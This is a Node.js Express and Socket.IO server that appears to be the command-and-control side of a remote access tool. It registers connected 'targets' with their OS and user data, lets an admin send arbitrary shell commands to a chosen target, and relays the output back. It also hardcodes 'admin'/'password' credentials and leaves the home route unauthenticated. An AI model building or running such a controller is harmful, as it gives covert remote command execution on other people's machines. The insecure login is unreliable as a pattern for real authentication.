//imports
const express = require('express');
const http = require('http');
const cors = require('cors');
const socketIO = require('socket.io')
const session = require('express-session');

//initialization
const app = express();
const server = http.createServer(app);
const io = socketIO(server);

//credentials
const F_username ="admin"
const F_password = "password"

//variables
let all_clients =[];
let all_socket = [];
const room = "FizzAndCookiesR1";
const PORT = 3000;

//middlewares
app.use(express.static(__dirname+'/public'));
app.use(cors())
app.use(session({
    secret: 'your-secret-key',
    resave: false,
    saveUninitialized: true
}));

// Middleware for parsing JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/',(req,res)=>{
    if(req.session.auth===true){
        res.redirect('/home')
    }else{
        res.redirect('/login')
    }
})

//socket io code
io.on('connection',(socket)=>{

    //handle socket connection error
    socket.on('connect_error', (error) => {
        console.error('Connection error:', error);
    });

    //join new clients to room
    socket.on('joinRoom', (data) => {
        socket.join(room);
        userObj = {"id":socket.id,"admin":(data.user==true)?false:true,"os":data.os,"joined":data.time,"userdata":data.data,"nickname":socket.id};
        console.log(`User joined room: ${room}`);
        all_socket.push(userObj);
        admins = all_socket.filter((element)=>element.admin == true);
        admins.forEach(element => {
          console.log(element.id);
          if(userObj.id !=element.id){
            io.to(element.id).emit("newcon",{userObj})
          };
        });
      });

      //change nickname of target
    socket.on('changeNickname',(data)=>{
        id = data.id
        nickname = data.nickname
        console.log(`ADMIN want to change ${id}'s nickname to ${nickname}`)
        console.log(all_socket)
        all_socket.map((item)=>{
            if(item.id == id){
                item.nickname =  nickname
                socket.emit("success","")
                console.log("success")
                return
            }
        })
    });

    //forward command from admin to target
    socket.on('runcmd',(data)=>{
        target = data.target
        command = data.cmd
        // console.log(`TARGET : ${target} COMMAND ${command}`)
        socket.to(data.target).emit('runcmd',{"from":socket.id,"cmd":command})

    });

    //ping test
    socket.on("ping",(data)=>{
      console.log("PING STARTED\n-------------------\n")
      target_id = data.target
      admin_id = socket.id
      console.log(`target : ${target_id} admin : ${admin_id}`)

      socket.to(target_id).emit("pingTest",{"from":admin_id})
      console.log("sent ping request to client")
      
    })

    //ping reply forward to admin
    socket.on("pingReply",(data)=>{
      console.log(`got reply from ${socket.id} to ${data.to}`)
      
        socket.to(data.to).emit("ping",{"success":true,"target":socket.id})
      
    })

    //forward result from target to admin
    socket.on('reply',(data)=>{
        to = data.to
        result = data.result
        socket.to(data.to).emit('reply',{"from":socket.id,"result":result})
    });

    //send targets array to clietn (admin)
    socket.on("getTarget",()=>{
        targets = all_socket.filter((element)=>element.admin !=true)
        io.to(socket.id).emit("targets",targets)
      });

    //send target details to client (admin)
    socket.on("targetDetails",(data)=>{
      console.log("get request")
      target_id = data.target
      admin = socket.id
      data = all_socket.filter((connection)=>connection.id === target_id);
      io.to(socket.id).emit("targetDetail",data)
    })

      //on client disconnection (deletes client from array)
      socket.on('disconnect', () => {
        disconnectedClient = socket.id;
        console.log(socket.id)
        for (let i=0;i<all_clients.length;i++){
         if(all_clients[i].id==socket.id){
           all_clients.splice(i,1);
         }
       }
       for (let i=0;i<all_socket.length;i++){
         if(all_socket[i].id==socket.id){
           all_socket.splice(i,1);
         }
       }
       admins = all_socket.filter((element)=>element.admin == true);
       admins.forEach(element => {
          io.to(element.id).emit("discon",{"target":disconnectedClient})
      });
       console.log('A user disconnected');
     });

})


//login route
app.get('/login',(req,res)=>{
    res.sendFile(__dirname+'/public/login.html')
})

//login verify (POST)
app.post('/login',(req,res)=>{
    const { username, password } = req.body;
    if(username === F_username && password === F_password){
        req.session.auth = true
        res.redirect('/')

    }else{
        res.redirect('/login')
    }
})


//home route
app.get('/home',(req,res)=>{
    res.sendFile(__dirname+'/public/home.html')
})

  //listen
  server.listen(PORT, () => {
    console.log('Server is running on http://localhost:'+PORT);
  });